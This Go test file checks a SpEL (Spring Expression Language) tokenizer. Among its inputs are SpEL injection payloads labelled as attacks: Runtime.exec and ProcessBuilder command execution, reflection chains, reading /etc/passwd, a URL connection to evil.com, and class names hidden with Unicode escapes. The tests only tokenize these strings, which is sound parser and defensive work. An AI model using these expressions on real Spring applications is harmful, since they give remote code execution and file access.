package main

import (
	"fmt"
	"github.com/weaweawe01/ParserSpel/ast"
	"testing"
)

// TokenExpectation 定义期望的token信息
type TokenExpectation struct {
	Kind  ast.TokenKind
	Value string
}

// TestSpelLexicalAnalysis 测试SpEL 最基本的词法分析功能
func TestSpelLexicalAnalysis(t *testing.T) {
	fmt.Println("=== SpEL 词法分析测试 ===")

	// 定义测试用例
	testCases := []struct {
		name        string
		expression  string
		description string
		expected    []TokenExpectation // 期望的token类型和值
	}{
		// 1. 数字字面量
		{"整数", "123", "整数字面量", []TokenExpectation{
			{ast.LITERAL_INT, "123"},
		}},
		{"长整数", "123L", "长整数字面量", []TokenExpectation{
			{ast.LITERAL_LONG, "123"},
		}},
		{"十六进制整数", "0x1A", "十六进制整数", []TokenExpectation{
			{ast.LITERAL_HEXINT, "1A"},
		}},
		{"十六进制长整数", "0x1AL", "十六进制长整数", []TokenExpectation{
			{ast.LITERAL_HEXLONG, "1A"},
		}},
		{"浮点数", "3.14", "浮点数字面量", []TokenExpectation{
			{ast.LITERAL_REAL, "3.14"},
		}},
		{"浮点数F", "3.14F", "float类型浮点数", []TokenExpectation{
			{ast.LITERAL_REAL_FLOAT, "3.14F"},
		}},
		{"科学计数法", "1.23e-4", "科学计数法表示", []TokenExpectation{
			{ast.LITERAL_REAL, "1.23e-4"},
		}},

		// 2. 字符串字面量
		{"单引号字符串", "'hello'", "单引号字符串", []TokenExpectation{
			{ast.LITERAL_STRING, "'hello'"},
		}},
		{"双引号字符串", "\"world\"", "双引号字符串", []TokenExpectation{
			{ast.LITERAL_STRING, "\"world\""},
		}},
		{"空字符串", "''", "空字符串", []TokenExpectation{
			{ast.LITERAL_STRING, "''"},
		}},

		// 3. 布尔值和null
		{"布尔值true", "true", "布尔值真", []TokenExpectation{
			{ast.IDENTIFIER, "true"},
		}},
		{"布尔值false", "false", "布尔值假", []TokenExpectation{
			{ast.IDENTIFIER, "false"},
		}},
		{"null值", "null", "null字面量", []TokenExpectation{
			{ast.IDENTIFIER, "null"},
		}},

		// 4. 标识符
		{"简单标识符", "name", "简单标识符", []TokenExpectation{
			{ast.IDENTIFIER, "name"},
		}},
		{"下划线标识符", "user_name", "包含下划线的标识符", []TokenExpectation{
			{ast.IDENTIFIER, "user_name"},
		}},

		// 5. 算术运算符
		{"加法", "a + b", "加法运算", []TokenExpectation{
			{ast.IDENTIFIER, "a"},
			{ast.PLUS, ""},
			{ast.IDENTIFIER, "b"},
		}},
		{"减法", "a - b", "减法运算", []TokenExpectation{
			{ast.IDENTIFIER, "a"},
			{ast.MINUS, ""},
			{ast.IDENTIFIER, "b"},
		}},
		{"乘法", "a * b", "乘法运算", []TokenExpectation{
			{ast.IDENTIFIER, "a"},
			{ast.STAR, ""},
			{ast.IDENTIFIER, "b"},
		}},
		{"除法", "a / b", "除法运算", []TokenExpectation{
			{ast.IDENTIFIER, "a"},
			{ast.DIV, ""},
			{ast.IDENTIFIER, "b"},
		}},

		// 6. 比较运算符
		{"等于", "a == b", "等于比较", []TokenExpectation{
			{ast.IDENTIFIER, "a"},
			{ast.EQ, ""},
			{ast.IDENTIFIER, "b"},
		}},
		{"不等于", "a != b", "不等于比较", []TokenExpectation{
			{ast.IDENTIFIER, "a"},
			{ast.NE, ""},
			{ast.IDENTIFIER, "b"},
		}},
		{"小于", "a < b", "小于比较", []TokenExpectation{
			{ast.IDENTIFIER, "a"},
			{ast.LT, ""},
			{ast.IDENTIFIER, "b"},
		}},
		{"大于", "a > b", "大于比较", []TokenExpectation{
			{ast.IDENTIFIER, "a"},
			{ast.GT, ""},
			{ast.IDENTIFIER, "b"},
		}},

		// 7. 逻辑运算符
		{"逻辑与", "a && b", "逻辑与运算", []TokenExpectation{
			{ast.IDENTIFIER, "a"},
			{ast.SYMBOLIC_AND, ""},
			{ast.IDENTIFIER, "b"},
		}},
		{"逻辑或", "a || b", "逻辑或运算", []TokenExpectation{
			{ast.IDENTIFIER, "a"},
			{ast.SYMBOLIC_OR, ""},
			{ast.IDENTIFIER, "b"},
		}},
		{"逻辑非", "!a", "逻辑非运算", []TokenExpectation{
			{ast.NOT, ""},
			{ast.IDENTIFIER, "a"},
		}},

		// 8. 分隔符和括号
		{"圆括号", "(a)", "圆括号分组", []TokenExpectation{
			{ast.LPAREN, ""},
			{ast.IDENTIFIER, "a"},
			{ast.RPAREN, ""},
		}},
		{"方括号", "a[0]", "方括号索引", []TokenExpectation{
			{ast.IDENTIFIER, "a"},
			{ast.LSQUARE, ""},
			{ast.LITERAL_INT, "0"},
			{ast.RSQUARE, ""},
		}},

		// 9. 属性访问和方法调用
		{"点号访问", "obj.property", "属性访问", []TokenExpectation{
			{ast.IDENTIFIER, "obj"},
			{ast.DOT, ""},
			{ast.IDENTIFIER, "property"},
		}},
		{"安全导航", "obj?.property", "安全导航运算符", []TokenExpectation{
			{ast.IDENTIFIER, "obj"},
			{ast.SAFE_NAVI, ""},
			{ast.IDENTIFIER, "property"},
		}},
		{"方法调用", "obj.method()", "方法调用", []TokenExpectation{
			{ast.IDENTIFIER, "obj"},
			{ast.DOT, ""},
			{ast.IDENTIFIER, "method"},
			{ast.LPAREN, ""},
			{ast.RPAREN, ""},
		}},

		// 10. 变量引用
		{"变量引用", "#variable", "变量引用", []TokenExpectation{
			{ast.HASH, ""},
			{ast.IDENTIFIER, "variable"},
		}},

		// 11. Bean引用
		{"Bean引用", "@beanName", "Spring Bean引用", []TokenExpectation{
			{ast.BEAN_REF, ""},
			{ast.IDENTIFIER, "beanName"},
		}},

		// 12. 类型引用
		{"类型引用", "T(String)", "类型引用", []TokenExpectation{
			{ast.IDENTIFIER, "T"},
			{ast.LPAREN, ""},
			{ast.IDENTIFIER, "String"},
			{ast.RPAREN, ""},
		}},

		// 13. 复杂表达式示例
		{"复杂表达式", "T(Math).PI", "类型引用和属性访问", []TokenExpectation{
			{ast.IDENTIFIER, "T"},
			{ast.LPAREN, ""},
			{ast.IDENTIFIER, "Math"},
			{ast.RPAREN, ""},
			{ast.DOT, ""},
			{ast.IDENTIFIER, "PI"},
		}},
		{"三元运算符", "a ? b : c", "三元条件运算符", []TokenExpectation{
			{ast.IDENTIFIER, "a"},
			{ast.QMARK, ""},
			{ast.IDENTIFIER, "b"},
			{ast.COLON, ""},
			{ast.IDENTIFIER, "c"},
		}},
	}

	// 执行测试用例
	successCount := 0
	totalCount := len(testCases)

	for i, testCase := range testCases {
		fmt.Printf("\n--- 测试 %d: %s ---\n", i+1, testCase.name)
		fmt.Printf("表达式: %s\n", testCase.expression)
		fmt.Printf("描述: %s\n", testCase.description)

		tokenizer := ast.NewTokenizer(testCase.expression)
		tokens, err := tokenizer.Process()

		if err != nil {
			fmt.Printf("❌ 词法分析失败: %v\n", err)
			continue
		}

		fmt.Printf("✅ 成功生成 %d 个token:\n", len(tokens))
		for j, token := range tokens {
			fmt.Printf("  [%d] [%s:%s](%d,%d)\n", j, token.Kind.String(), token.StringValue(), token.StartPos, token.EndPos)
		}

		// 验证token是否符合期望
		if len(testCase.expected) > 0 {
			fmt.Printf("期望 %d 个token:\n", len(testCase.expected))
			for j, expected := range testCase.expected {
				fmt.Printf("  [%d] [%s:%s]\n", j, expected.Kind.String(), expected.Value)
			}

			// 检查token数量
			if len(tokens) != len(testCase.expected) {
				fmt.Printf("❌ Token数量不匹配: 期望 %d, 实际 %d\n", len(testCase.expected), len(tokens))
				continue
			}

			// 检查每个token
			allMatch := true
			for j, expected := range testCase.expected {
				if j >= len(tokens) {
					fmt.Printf("❌ Token %d 缺失\n", j)
					allMatch = false
					break
				}

				token := tokens[j]
				if token.Kind != expected.Kind {
					fmt.Printf("❌ Token %d 类型不匹配: 期望 %s, 实际 %s\n", j, expected.Kind.String(), token.Kind.String())
					allMatch = false
				}
				if token.StringValue() != expected.Value {
					fmt.Printf("❌ Token %d 值不匹配: 期望 '%s', 实际 '%s'\n", j, expected.Value, token.StringValue())
					allMatch = false
				}
			}

			if allMatch {
				fmt.Printf("✅ 所有token验证通过！\n")
				successCount++
			}
		} else {
			fmt.Printf("✅ 词法分析成功（无验证规则）\n")
			successCount++
		}
	}

	// 输出测试结果统计
	fmt.Printf("\n=== 测试结果统计 ===\n")
	fmt.Printf("总测试用例: %d\n", totalCount)
	fmt.Printf("成功: %d\n", successCount)
	fmt.Printf("失败: %d\n", totalCount-successCount)
	fmt.Printf("成功率: %.1f%%\n", float64(successCount)/float64(totalCount)*100)

	if successCount != totalCount {
		t.Errorf("词法分析测试失败: %d/%d 个测试用例通过", successCount, totalCount)
	}
}

// TestSpelModerateLexicalAnalysis 测试SpEL 中等复杂度
func TestSpelModerateLexicalAnalysis(t *testing.T) {
	fmt.Println("=== SpEL 词法中等复杂度分析测试 ===")

	// 定义测试用例 - 包含攻击性payload和复杂表达式
	testCases := []struct {
		name        string
		expression  string
		description string
		expected    []TokenExpectation // 期望的token类型和值
	}{
		// 1. 基本复杂表达式
		{"三元运算符", "a ? b : c", "三元条件运算符", []TokenExpectation{
			{ast.IDENTIFIER, "a"},
			{ast.QMARK, ""},
			{ast.IDENTIFIER, "b"},
			{ast.COLON, ""},
			{ast.IDENTIFIER, "c"},
		}},

		// 2. 命令执行类攻击payload
		{"Runtime执行命令", "T(java.lang.Runtime).getRuntime().exec('whoami')", "Runtime命令执行攻击", []TokenExpectation{
			{ast.IDENTIFIER, "T"},
			{ast.LPAREN, ""},
			{ast.IDENTIFIER, "java"},
			{ast.DOT, ""},
			{ast.IDENTIFIER, "lang"},
			{ast.DOT, ""},
			{ast.IDENTIFIER, "Runtime"},
			{ast.RPAREN, ""},
			{ast.DOT, ""},
			{ast.IDENTIFIER, "getRuntime"},
			{ast.LPAREN, ""},
			{ast.RPAREN, ""},
			{ast.DOT, ""},
			{ast.IDENTIFIER, "exec"},
			{ast.LPAREN, ""},
			{ast.LITERAL_STRING, "'whoami'"},
			{ast.RPAREN, ""},
		}},

		{"ProcessBuilder攻击", "new java.lang.ProcessBuilder('cmd','/c','calc').start()", "ProcessBuilder命令执行", []TokenExpectation{
			{ast.IDENTIFIER, "new"},
			{ast.IDENTIFIER, "java"},
			{ast.DOT, ""},
			{ast.IDENTIFIER, "lang"},
			{ast.DOT, ""},
			{ast.IDENTIFIER, "ProcessBuilder"},
			{ast.LPAREN, ""},
			{ast.LITERAL_STRING, "'cmd'"},
			{ast.COMMA, ""},
			{ast.LITERAL_STRING, "'/c'"},
			{ast.COMMA, ""},
			{ast.LITERAL_STRING, "'calc'"},
			{ast.RPAREN, ""},
			{ast.DOT, ""},
			{ast.IDENTIFIER, "start"},
			{ast.LPAREN, ""},
			{ast.RPAREN, ""},
		}},

		// 3. 文件操作攻击
		{"文件读取攻击", "T(java.io.File).new('/etc/passwd').exists()", "文件系统访问攻击", []TokenExpectation{
			{ast.IDENTIFIER, "T"},
			{ast.LPAREN, ""},
			{ast.IDENTIFIER, "java"},
			{ast.DOT, ""},
			{ast.IDENTIFIER, "io"},
			{ast.DOT, ""},
			{ast.IDENTIFIER, "File"},
			{ast.RPAREN, ""},
			{ast.DOT, ""},
			{ast.IDENTIFIER, "new"},
			{ast.LPAREN, ""},
			{ast.LITERAL_STRING, "'/etc/passwd'"},
			{ast.RPAREN, ""},
			{ast.DOT, ""},
			{ast.IDENTIFIER, "exists"},
			{ast.LPAREN, ""},
			{ast.RPAREN, ""},
		}},

		{"URL连接攻击", "T(java.net.URL).new('http://evil.com').openConnection()", "网络连接攻击", []TokenExpectation{
			{ast.IDENTIFIER, "T"},
			{ast.LPAREN, ""},
			{ast.IDENTIFIER, "java"},
			{ast.DOT, ""},
			{ast.IDENTIFIER, "net"},
			{ast.DOT, ""},
			{ast.IDENTIFIER, "URL"},
			{ast.RPAREN, ""},
			{ast.DOT, ""},
			{ast.IDENTIFIER, "new"},
			{ast.LPAREN, ""},
			{ast.LITERAL_STRING, "'http://evil.com'"},
			{ast.RPAREN, ""},
			{ast.DOT, ""},
			{ast.IDENTIFIER, "openConnection"},
			{ast.LPAREN, ""},
			{ast.RPAREN, ""},
		}},

		// 4. 反射调用攻击
		{"反射调用攻击", "T(Class).forName('java.lang.Runtime').getMethod('exec',T(String))", "反射获取方法", []TokenExpectation{
			{ast.IDENTIFIER, "T"},
			{ast.LPAREN, ""},
			{ast.IDENTIFIER, "Class"},
			{ast.RPAREN, ""},
			{ast.DOT, ""},
			{ast.IDENTIFIER, "forName"},
			{ast.LPAREN, ""},
			{ast.LITERAL_STRING, "'java.lang.Runtime'"},
			{ast.RPAREN, ""},
			{ast.DOT, ""},
			{ast.IDENTIFIER, "getMethod"},
			{ast.LPAREN, ""},
			{ast.LITERAL_STRING, "'exec'"},
			{ast.COMMA, ""},
			{ast.IDENTIFIER, "T"},
			{ast.LPAREN, ""},
			{ast.IDENTIFIER, "String"},
			{ast.RPAREN, ""},
			{ast.RPAREN, ""},
		}},

		// 5. 系统属性访问
		{"系统属性获取", "T(System).getProperty('user.home')", "获取系统属性", []TokenExpectation{
			{ast.IDENTIFIER, "T"},
			{ast.LPAREN, ""},
			{ast.IDENTIFIER, "System"},
			{ast.RPAREN, ""},
			{ast.DOT, ""},
			{ast.IDENTIFIER, "getProperty"},
			{ast.LPAREN, ""},
			{ast.LITERAL_STRING, "'user.home'"},
			{ast.RPAREN, ""},
		}},

		{"环境变量获取", "T(System).getenv('PATH')", "获取环境变量", []TokenExpectation{
			{ast.IDENTIFIER, "T"},
			{ast.LPAREN, ""},
			{ast.IDENTIFIER, "System"},
			{ast.RPAREN, ""},
			{ast.DOT, ""},
			{ast.IDENTIFIER, "getenv"},
			{ast.LPAREN, ""},
			{ast.LITERAL_STRING, "'PATH'"},
			{ast.RPAREN, ""},
		}},

		// 6. 复杂嵌套表达式
		{"复杂嵌套调用", "T(Thread).currentThread().getContextClassLoader().loadClass('Evil')", "复杂类加载攻击", []TokenExpectation{
			{ast.IDENTIFIER, "T"},
			{ast.LPAREN, ""},
			{ast.IDENTIFIER, "Thread"},
			{ast.RPAREN, ""},
			{ast.DOT, ""},
			{ast.IDENTIFIER, "currentThread"},
			{ast.LPAREN, ""},
			{ast.RPAREN, ""},
			{ast.DOT, ""},
			{ast.IDENTIFIER, "getContextClassLoader"},
			{ast.LPAREN, ""},
			{ast.RPAREN, ""},
			{ast.DOT, ""},
			{ast.IDENTIFIER, "loadClass"},
			{ast.LPAREN, ""},
			{ast.LITERAL_STRING, "'Evil'"},
			{ast.RPAREN, ""},
		}},

		// 7. 数组和集合操作
		{"数组初始化", "new int[]{1,2,3}", "数组初始化攻击", []TokenExpectation{
			{ast.IDENTIFIER, "new"},
			{ast.IDENTIFIER, "int"},
			{ast.LSQUARE, ""},
			{ast.RSQUARE, ""},
			{ast.LCURLY, ""},
			{ast.LITERAL_INT, "1"},
			{ast.COMMA, ""},
			{ast.LITERAL_INT, "2"},
			{ast.COMMA, ""},
			{ast.LITERAL_INT, "3"},
			{ast.RCURLY, ""},
		}},

		// 8. 方法链式调用
		{"方法链攻击", "T(String).valueOf(123).getClass().getClassLoader()", "方法链式调用攻击", []TokenExpectation{
			{ast.IDENTIFIER, "T"},
			{ast.LPAREN, ""},
			{ast.IDENTIFIER, "String"},
			{ast.RPAREN, ""},
			{ast.DOT, ""},
			{ast.IDENTIFIER, "valueOf"},
			{ast.LPAREN, ""},
			{ast.LITERAL_INT, "123"},
			{ast.RPAREN, ""},
			{ast.DOT, ""},
			{ast.IDENTIFIER, "getClass"},
			{ast.LPAREN, ""},
			{ast.RPAREN, ""},
			{ast.DOT, ""},
			{ast.IDENTIFIER, "getClassLoader"},
			{ast.LPAREN, ""},
			{ast.RPAREN, ""},
		}},

		// 9. 恶意字符串构造
		{"Base64解码攻击", "T(java.util.Base64).getDecoder().decode('Y21k')", "Base64解码攻击", []TokenExpectation{
			{ast.IDENTIFIER, "T"},
			{ast.LPAREN, ""},
			{ast.IDENTIFIER, "java"},
			{ast.DOT, ""},
			{ast.IDENTIFIER, "util"},
			{ast.DOT, ""},
			{ast.IDENTIFIER, "Base64"},
			{ast.RPAREN, ""},
			{ast.DOT, ""},
			{ast.IDENTIFIER, "getDecoder"},
			{ast.LPAREN, ""},
			{ast.RPAREN, ""},
			{ast.DOT, ""},
			{ast.IDENTIFIER, "decode"},
			{ast.LPAREN, ""},
			{ast.LITERAL_STRING, "'Y21k'"},
			{ast.RPAREN, ""},
		}},

		// 10. 复杂条件表达式
		{"复杂三元表达式", "T(System).getProperty('os.name').contains('Windows') ? 'cmd' : '/bin/sh'", "条件命令选择", []TokenExpectation{
			{ast.IDENTIFIER, "T"},
			{ast.LPAREN, ""},
			{ast.IDENTIFIER, "System"},
			{ast.RPAREN, ""},
			{ast.DOT, ""},
			{ast.IDENTIFIER, "getProperty"},
			{ast.LPAREN, ""},
			{ast.LITERAL_STRING, "'os.name'"},
			{ast.RPAREN, ""},
			{ast.DOT, ""},
			{ast.IDENTIFIER, "contains"},
			{ast.LPAREN, ""},
			{ast.LITERAL_STRING, "'Windows'"},
			{ast.RPAREN, ""},
			{ast.QMARK, ""},
			{ast.LITERAL_STRING, "'cmd'"},
			{ast.COLON, ""},
			{ast.LITERAL_STRING, "'/bin/sh'"},
		}},
	}

	// 执行测试用例
	successCount := 0
	totalCount := len(testCases)

	for i, testCase := range testCases {
		fmt.Printf("\n--- 测试 %d: %s ---\n", i+1, testCase.name)
		fmt.Printf("表达式: %s\n", testCase.expression)
		fmt.Printf("描述: %s\n", testCase.description)

		tokenizer := ast.NewTokenizer(testCase.expression)
		tokens, err := tokenizer.Process()

		if err != nil {
			fmt.Printf("❌ 词法分析失败: %v\n", err)
			continue
		}

		fmt.Printf("✅ 成功生成 %d 个token:\n", len(tokens))
		for j, token := range tokens {
			fmt.Printf("  [%d] [%s:%s](%d,%d)\n", j, token.Kind.String(), token.StringValue(), token.StartPos, token.EndPos)
		}

		// 验证token是否符合期望
		if len(testCase.expected) > 0 {
			fmt.Printf("期望 %d 个token:\n", len(testCase.expected))
			for j, expected := range testCase.expected {
				fmt.Printf("  [%d] [%s:%s]\n", j, expected.Kind.String(), expected.Value)
			}

			// 检查token数量
			if len(tokens) != len(testCase.expected) {
				fmt.Printf("❌ Token数量不匹配: 期望 %d, 实际 %d\n", len(testCase.expected), len(tokens))
				continue
			}

			// 检查每个token
			allMatch := true
			for j, expected := range testCase.expected {
				if j >= len(tokens) {
					fmt.Printf("❌ Token %d 缺失\n", j)
					allMatch = false
					break
				}

				token := tokens[j]
				if token.Kind != expected.Kind {
					fmt.Printf("❌ Token %d 类型不匹配: 期望 %s, 实际 %s\n", j, expected.Kind.String(), token.Kind.String())
					allMatch = false
				}
				if token.StringValue() != expected.Value {
					fmt.Printf("❌ Token %d 值不匹配: 期望 '%s', 实际 '%s'\n", j, expected.Value, token.StringValue())
					allMatch = false
				}
			}

			if allMatch {
				fmt.Printf("✅ 所有token验证通过！\n")
				successCount++
			}
		} else {
			fmt.Printf("✅ 词法分析成功（无验证规则）\n")
			successCount++
		}
	}

	// 输出测试结果统计
	fmt.Printf("\n=== 测试结果统计 ===\n")
	fmt.Printf("总测试用例: %d\n", totalCount)
	fmt.Printf("成功: %d\n", successCount)
	fmt.Printf("失败: %d\n", totalCount-successCount)
	fmt.Printf("成功率: %.1f%%\n", float64(successCount)/float64(totalCount)*100)

	if successCount != totalCount {
		t.Errorf("词法分析测试失败: %d/%d 个测试用例通过", successCount, totalCount)
	}
}

// TestSpelAdvancedLexicalAnalysis 测试SpEL高难度词法分析
func TestSpelAdvancedLexicalAnalysis(t *testing.T) {
	fmt.Println("=== SpEL 高难度词法分析测试 ===")

	// 定义高难度测试用例 - 包含Unicode、多层嵌套、复杂攻击payload
	testCases := []struct {
		name        string
		expression  string
		description string
		expected    []TokenExpectation // 期望的token类型和值
	}{
		// 1. Unicode编码攻击
		{"Unicode字符串攻击", "'\\u0063\\u006d\\u0064\\u002e\\u0065\\u0078\\u0065'", "Unicode编码的cmd.exe", []TokenExpectation{
			{ast.LITERAL_STRING, "'\\u0063\\u006d\\u0064\\u002e\\u0065\\u0078\\u0065'"},
		}},

		// 2. 多层深度嵌套攻击
		{"极深嵌套反射", "T(Class).forName('java.lang.Runtime').getDeclaredMethod('exec',T(String)).invoke(T(Runtime).getRuntime(),'calc')", "深度嵌套反射调用", []TokenExpectation{
			{ast.IDENTIFIER, "T"},
			{ast.LPAREN, ""},
			{ast.IDENTIFIER, "Class"},
			{ast.RPAREN, ""},
			{ast.DOT, ""},
			{ast.IDENTIFIER, "forName"},
			{ast.LPAREN, ""},
			{ast.LITERAL_STRING, "'java.lang.Runtime'"},
			{ast.RPAREN, ""},
			{ast.DOT, ""},
			{ast.IDENTIFIER, "getDeclaredMethod"},
			{ast.LPAREN, ""},
			{ast.LITERAL_STRING, "'exec'"},
			{ast.COMMA, ""},
			{ast.IDENTIFIER, "T"},
			{ast.LPAREN, ""},
			{ast.IDENTIFIER, "String"},
			{ast.RPAREN, ""},
			{ast.RPAREN, ""},
			{ast.DOT, ""},
			{ast.IDENTIFIER, "invoke"},
			{ast.LPAREN, ""},
			{ast.IDENTIFIER, "T"},
			{ast.LPAREN, ""},
			{ast.IDENTIFIER, "Runtime"},
			{ast.RPAREN, ""},
			{ast.DOT, ""},
			{ast.IDENTIFIER, "getRuntime"},
			{ast.LPAREN, ""},
			{ast.RPAREN, ""},
			{ast.COMMA, ""},
			{ast.LITERAL_STRING, "'calc'"},
			{ast.RPAREN, ""},
		}},

		// 3. 复杂算术和逻辑组合
		{"复杂算术逻辑", "(1 + 2) * 3 - 4 / 2 % 3 && true || false && !null", "复杂算术逻辑运算", []TokenExpectation{
			{ast.LPAREN, ""},
			{ast.LITERAL_INT, "1"},
			{ast.PLUS, ""},
			{ast.LITERAL_INT, "2"},
			{ast.RPAREN, ""},
			{ast.STAR, ""},
			{ast.LITERAL_INT, "3"},
			{ast.MINUS, ""},
			{ast.LITERAL_INT, "4"},
			{ast.DIV, ""},
			{ast.LITERAL_INT, "2"},
			{ast.MOD, ""},
			{ast.LITERAL_INT, "3"},
			{ast.SYMBOLIC_AND, ""},
			{ast.IDENTIFIER, "true"},
			{ast.SYMBOLIC_OR, ""},
			{ast.IDENTIFIER, "false"},
			{ast.SYMBOLIC_AND, ""},
			{ast.NOT, ""},
			{ast.IDENTIFIER, "null"},
		}},

		// 4. 混合编码攻击
		{"混合编码绕过", "T(Class).forName('\\u006a\\u0061\\u0076\\u0061.\\u006c\\u0061\\u006e\\u0067.\\u0052\\u0075\\u006e\\u0074\\u0069\\u006d\\u0065')", "Unicode混合编码类名", []TokenExpectation{
			{ast.IDENTIFIER, "T"},
			{ast.LPAREN, ""},
			{ast.IDENTIFIER, "Class"},
			{ast.RPAREN, ""},
			{ast.DOT, ""},
			{ast.IDENTIFIER, "forName"},
			{ast.LPAREN, ""},
			{ast.LITERAL_STRING, "'\\u006a\\u0061\\u0076\\u0061.\\u006c\\u0061\\u006e\\u0067.\\u0052\\u0075\\u006e\\u0074\\u0069\\u006d\\u0065'"},
			{ast.RPAREN, ""},
		}},

		// 6. 科学计数法和十六进制混合
		{"混合数字格式", "0xFF + 3.14e-2 * 0x1A2B3C4D", "十六进制和科学计数法混合", []TokenExpectation{
			{ast.LITERAL_HEXINT, "FF"},
			{ast.PLUS, ""},
			{ast.LITERAL_REAL, "3.14e-2"},
			{ast.STAR, ""},
			{ast.LITERAL_HEXINT, "1A2B3C4D"},
		}},

		// 7. 超复杂嵌套表达式（终极测试）
		{"终极复杂表达式", "T(Class).forName('java.lang.Runtime').getDeclaredMethod('exec',new Class[]{T(String)}).invoke(T(Runtime).getRuntime(),new Object[]{'\\u0063\\u006d\\u0064'})", "终极复杂嵌套攻击", []TokenExpectation{
			{ast.IDENTIFIER, "T"},
			{ast.LPAREN, ""},
			{ast.IDENTIFIER, "Class"},
			{ast.RPAREN, ""},
			{ast.DOT, ""},
			{ast.IDENTIFIER, "forName"},
			{ast.LPAREN, ""},
			{ast.LITERAL_STRING, "'java.lang.Runtime'"},
			{ast.RPAREN, ""},
			{ast.DOT, ""},
			{ast.IDENTIFIER, "getDeclaredMethod"},
			{ast.LPAREN, ""},
			{ast.LITERAL_STRING, "'exec'"},
			{ast.COMMA, ""},
			{ast.IDENTIFIER, "new"},
			{ast.IDENTIFIER, "Class"},
			{ast.LSQUARE, ""},
			{ast.RSQUARE, ""},
			{ast.LCURLY, ""},
			{ast.IDENTIFIER, "T"},
			{ast.LPAREN, ""},
			{ast.IDENTIFIER, "String"},
			{ast.RPAREN, ""},
			{ast.RCURLY, ""},
			{ast.RPAREN, ""},
			{ast.DOT, ""},
			{ast.IDENTIFIER, "invoke"},
			{ast.LPAREN, ""},
			{ast.IDENTIFIER, "T"},
			{ast.LPAREN, ""},
			{ast.IDENTIFIER, "Runtime"},
			{ast.RPAREN, ""},
			{ast.DOT, ""},
			{ast.IDENTIFIER, "getRuntime"},
			{ast.LPAREN, ""},
			{ast.RPAREN, ""},
			{ast.COMMA, ""},
			{ast.IDENTIFIER, "new"},
			{ast.IDENTIFIER, "Object"},
			{ast.LSQUARE, ""},
			{ast.RSQUARE, ""},
			{ast.LCURLY, ""},
			{ast.LITERAL_STRING, "'\\u0063\\u006d\\u0064'"},
			{ast.RCURLY, ""},
			{ast.RPAREN, ""},
		}},
	}

	// 执行测试用例
	successCount := 0
	totalCount := len(testCases)

	for i, testCase := range testCases {
		fmt.Printf("\n--- 高难度测试 %d: %s ---\n", i+1, testCase.name)
		fmt.Printf("表达式: %s\n", testCase.expression)
		fmt.Printf("描述: %s\n", testCase.description)

		tokenizer := ast.NewTokenizer(testCase.expression)
		tokens, err := tokenizer.Process()

		if err != nil {
			fmt.Printf("❌ 词法分析失败: %v\n", err)
			continue
		}

		fmt.Printf("✅ 成功生成 %d 个token:\n", len(tokens))
		for j, token := range tokens {
			fmt.Printf("  [%d] [%s:%s](%d,%d)\n", j, token.Kind.String(), token.StringValue(), token.StartPos, token.EndPos)
		}

		// 验证token是否符合期望
		if len(testCase.expected) > 0 {
			fmt.Printf("期望 %d 个token:\n", len(testCase.expected))
			for j, expected := range testCase.expected {
				fmt.Printf("  [%d] [%s:%s]\n", j, expected.Kind.String(), expected.Value)
			}

			// 检查token数量
			if len(tokens) != len(testCase.expected) {
				fmt.Printf("❌ Token数量不匹配: 期望 %d, 实际 %d\n", len(testCase.expected), len(tokens))
				continue
			}

			// 检查每个token
			allMatch := true
			for j, expected := range testCase.expected {
				if j >= len(tokens) {
					fmt.Printf("❌ Token %d 缺失\n", j)
					allMatch = false
					break
				}

				token := tokens[j]
				if token.Kind != expected.Kind {
					fmt.Printf("❌ Token %d 类型不匹配: 期望 %s, 实际 %s\n", j, expected.Kind.String(), token.Kind.String())
					allMatch = false
				}
				if expected.Value != "" && token.StringValue() != expected.Value {
					fmt.Printf("❌ Token %d 值不匹配: 期望 '%s', 实际 '%s'\n", j, expected.Value, token.StringValue())
					allMatch = false
				}
			}

			if allMatch {
				fmt.Printf("✅ 所有token验证通过！\n")
				successCount++
			}
		} else {
			fmt.Printf("✅ 词法分析成功（无验证规则）\n")
			successCount++
		}
	}

	// 输出测试结果统计
	fmt.Printf("\n=== 高难度测试结果统计 ===\n")
	fmt.Printf("总测试用例: %d\n", totalCount)
	fmt.Printf("成功: %d\n", successCount)
	fmt.Printf("失败: %d\n", totalCount-successCount)
	fmt.Printf("成功率: %.1f%%\n", float64(successCount)/float64(totalCount)*100)

	if successCount != totalCount {
		t.Errorf("高难度词法分析测试失败: %d/%d 个测试用例通过", successCount, totalCount)
	}
}
